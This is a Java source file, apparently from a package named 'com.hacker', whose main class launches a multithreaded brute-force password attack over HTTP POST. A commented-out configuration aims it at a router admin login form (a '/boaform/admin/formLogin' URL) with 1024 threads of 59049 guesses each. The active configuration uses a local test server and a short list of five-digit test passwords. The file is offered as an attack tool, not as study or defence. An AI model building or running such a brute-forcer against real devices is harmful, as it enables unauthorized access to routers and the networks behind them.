package com.hacker;

import org.json.simple.JSONObject;

public class Main {
    public static void main(String[] args) {
//        String url = "http://192.168.55.1/boaform/admin/formLogin";
//        final int NUM_OF_THREAD = 1024;
//        final int NUM_OF_EACH_THREAD_REQUEST = 59049;

        final int NUM_OF_THREAD = 20;
        final int NUM_OF_EACH_THREAD_REQUEST = 1; // 이 두 수의 곱이 fiveDigiArr 의 크기와 일치해야 함.

        String url = "http://127.0.0.1:8090/test";
        try {
            EachLetterCreator elc = new EachLetterCreator();
            char[] eachLetterArr = elc.createEachLetter();

//            PasswordMakser pm = new PasswordMakser();
//            String[] fiveDigitArr = pm.createPasswords(eachLetterArr);

            String[] fiveDigitArr = {"00000", "00001", "00002", "00003", "00004", "00005", "00006", "00007", "00008", "00009", "00000",
                    "00001", "00002", "00003", "00004", "00005", "00006", "00007", "00008", "00009"}; // test

            HttpRequester httpRequester = new HttpRequester();

            long startTime = System.currentTimeMillis();
            System.out.println("총 개수 : " + fiveDigitArr.length);
            System.out.println("Start : " + startTime);

            PostThread[] threadArray = new PostThread[NUM_OF_THREAD];
            int fiveDigitStartIdx = 0;
            for (int i = 0; i < NUM_OF_THREAD; i++) {
                PostThread pt = new PostThread(httpRequester, url, eachLetterArr);
                String[] fiveDigitArrForThread = new String[NUM_OF_EACH_THREAD_REQUEST]; // 59049
                int startIdx = fiveDigitStartIdx;

                for (int j = startIdx; j < startIdx + NUM_OF_EACH_THREAD_REQUEST; j++) {
                    fiveDigitArrForThread[j - fiveDigitStartIdx] = fiveDigitArr[j];
                    fiveDigitStartIdx++;
                }

                pt.setFiveDigitArr(fiveDigitArrForThread);
                threadArray[i] = pt;
                pt.start();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
